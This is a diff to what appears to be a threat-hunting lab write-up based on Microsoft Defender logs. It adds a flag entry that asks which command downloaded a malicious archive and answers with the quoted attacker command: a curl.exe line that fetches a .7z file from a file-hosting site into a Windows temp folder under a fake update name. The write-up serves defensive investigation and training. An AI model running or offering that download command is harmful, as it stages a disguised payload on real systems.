@@ -65,5 +65,14 @@ Microsoft Defender for Endpoint Logs
 **Finding**:
 - **Hosting URL**: litter.catbox.moe
 
+### 🔹 Flag 5 - EXECUTION - Malware Download Command
+**Objective**: What command was used to download the malicious archive
 
+**KQL Query**:
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20103309.png?raw=true)
 
+**Results:**
+![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20103329.png?raw=true)
+
+**Finding**:
+- **Command**: "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
